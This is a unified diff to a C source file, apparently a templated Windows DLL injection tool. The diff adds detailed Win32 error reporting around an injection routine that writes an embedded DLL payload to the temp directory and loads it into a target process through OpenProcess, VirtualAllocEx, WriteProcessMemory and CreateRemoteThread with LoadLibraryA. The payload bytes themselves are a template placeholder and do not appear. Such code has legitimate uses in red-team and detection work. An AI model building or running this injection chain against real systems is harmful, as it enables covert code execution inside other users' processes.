@@ -11,6 +11,63 @@ static const SIZE_T embedded_dll_len =
     (SIZE_T){{PAYLOAD_BYTES_LEN}};
 
 
+static void report_win32_error(
+    const char *operation,
+    DWORD error_code
+)
+{
+    LPSTR message = NULL;
+    DWORD length;
+
+    length = FormatMessageA(
+        FORMAT_MESSAGE_ALLOCATE_BUFFER |
+        FORMAT_MESSAGE_FROM_SYSTEM |
+        FORMAT_MESSAGE_IGNORE_INSERTS,
+        NULL,
+        error_code,
+        0,
+        (LPSTR)&message,
+        0,
+        NULL
+    );
+
+    if (
+        length != 0 &&
+        message != NULL
+    )
+    {
+        while (
+            length > 0 &&
+            (
+                message[length - 1] == '\r' ||
+                message[length - 1] == '\n'
+            )
+        )
+        {
+            message[--length] = '\0';
+        }
+
+        fprintf(
+            stderr,
+            "[-] %s failed: %s (%lu)\n",
+            operation,
+            message,
+            (unsigned long)error_code
+        );
+
+        LocalFree(message);
+        return;
+    }
+
+    fprintf(
+        stderr,
+        "[-] %s failed: Win32 error %lu\n",
+        operation,
+        (unsigned long)error_code
+    );
+}
+
+
 typedef BOOL (WINAPI *IS_WOW64_PROCESS2_FN)(
     HANDLE,
     USHORT *,
@@ -59,6 +116,13 @@ static int target_architecture(
                 &native_machine
             ))
             {
+                DWORD error_code = GetLastError();
+
+                report_win32_error(
+                    "IsWow64Process2",
+                    error_code
+                );
+
                 return 0;
             }
 
@@ -121,6 +185,13 @@ static int target_architecture(
             &wow64
         ))
         {
+            DWORD error_code = GetLastError();
+
+            report_win32_error(
+                "IsWow64Process",
+                error_code
+            );
+
             return 0;
         }
 
@@ -190,11 +261,25 @@ static int stage_dll(
         temp_dir
     );
 
-    if (
-        temp_len == 0 ||
-        temp_len >= MAX_PATH
-    )
+    if (temp_len == 0)
     {
+        DWORD error_code = GetLastError();
+
+        report_win32_error(
+            "GetTempPathA",
+            error_code
+        );
+
+        return -2;
+    }
+
+    if (temp_len >= MAX_PATH)
+    {
+        fprintf(
+            stderr,
+            "[-] Temporary path exceeds buffer size\n"
+        );
+
         return -2;
     }
 
@@ -227,6 +312,13 @@ static int stage_dll(
 
     if (file == INVALID_HANDLE_VALUE)
     {
+        DWORD error_code = GetLastError();
+
+        report_win32_error(
+            "CreateFileA",
+            error_code
+        );
+
         return -4;
     }
 
@@ -238,6 +330,13 @@ static int stage_dll(
         NULL
     ))
     {
+        DWORD error_code = GetLastError();
+
+        report_win32_error(
+            "WriteFile",
+            error_code
+        );
+
         CloseHandle(file);
         DeleteFileA(dll_path);
         return -5;
@@ -247,6 +346,13 @@ static int stage_dll(
 
     if (written != (DWORD)payload_len)
     {
+        fprintf(
+            stderr,
+            "[-] DLL staging write truncated: %lu / %llu bytes\n",
+            (unsigned long)written,
+            (unsigned long long)payload_len
+        );
+
         DeleteFileA(dll_path);
         return -6;
     }
@@ -287,6 +393,13 @@ static int execute_technique(
 
     if (process == NULL)
     {
+        DWORD error_code = GetLastError();
+
+        report_win32_error(
+            "OpenProcess",
+            error_code
+        );
+
         return -1;
     }
 
@@ -344,6 +457,13 @@ static int execute_technique(
 
     if (remote_path == NULL)
     {
+        DWORD error_code = GetLastError();
+
+        report_win32_error(
+            "VirtualAllocEx",
+            error_code
+        );
+
         DeleteFileA(dll_path);
         CloseHandle(process);
         return -20;
@@ -357,6 +477,13 @@ static int execute_technique(
         &written
     ))
     {
+        DWORD error_code = GetLastError();
+
+        report_win32_error(
+            "WriteProcessMemory",
+            error_code
+        );
+
         VirtualFreeEx(
             process,
             remote_path,
@@ -371,6 +498,13 @@ static int execute_technique(
 
     if (written != path_size)
     {
+        fprintf(
+            stderr,
+            "[-] Remote path write truncated: %llu / %llu bytes\n",
+            (unsigned long long)written,
+            (unsigned long long)path_size
+        );
+
         VirtualFreeEx(
             process,
             remote_path,
@@ -389,6 +523,13 @@ static int execute_technique(
 
     if (kernel32 == NULL)
     {
+        DWORD error_code = GetLastError();
+
+        report_win32_error(
+            "GetModuleHandleA",
+            error_code
+        );
+
         VirtualFreeEx(
             process,
             remote_path,
@@ -408,6 +549,13 @@ static int execute_technique(
 
     if (load_library_a == NULL)
     {
+        DWORD error_code = GetLastError();
+
+        report_win32_error(
+            "GetProcAddress",
+            error_code
+        );
+
         VirtualFreeEx(
             process,
             remote_path,
@@ -432,6 +580,13 @@ static int execute_technique(
 
     if (thread == NULL)
     {
+        DWORD error_code = GetLastError();
+
+        report_win32_error(
+            "CreateRemoteThread",
+            error_code
+        );
+
         VirtualFreeEx(
             process,
             remote_path,
@@ -449,8 +604,36 @@ static int execute_technique(
         INFINITE
     );
 
+    if (wait_result == WAIT_FAILED)
+    {
+        DWORD error_code = GetLastError();
+
+        report_win32_error(
+            "WaitForSingleObject",
+            error_code
+        );
+
+        CloseHandle(thread);
+
+        VirtualFreeEx(
+            process,
+            remote_path,
+            0,
+            MEM_RELEASE
+        );
+
+        CloseHandle(process);
+        return -26;
+    }
+
     if (wait_result != WAIT_OBJECT_0)
     {
+        fprintf(
+            stderr,
+            "[-] Unexpected wait status: 0x%08lX\n",
+            (unsigned long)wait_result
+        );
+
         CloseHandle(thread);
 
         VirtualFreeEx(
@@ -469,6 +652,13 @@ static int execute_technique(
         &thread_exit_code
     ))
     {
+        DWORD error_code = GetLastError();
+
+        report_win32_error(
+            "GetExitCodeThread",
+            error_code
+        );
+
         CloseHandle(thread);
 
         VirtualFreeEx(
@@ -484,6 +674,11 @@ static int execute_technique(
 
     if (thread_exit_code == 0)
     {
+        fprintf(
+            stderr,
+            "[-] LoadLibraryA returned NULL in the target process\n"
+        );
+
         CloseHandle(thread);
 
         VirtualFreeEx(
@@ -592,9 +787,8 @@ int main(int argc, char **argv)
     {
         fprintf(
             stderr,
-            "DLL Injection failed: %d (Win32=%lu)\n",
-            result,
-            GetLastError()
+            "DLL Injection failed: %d\n",
+            result
         );
 
         return 1;
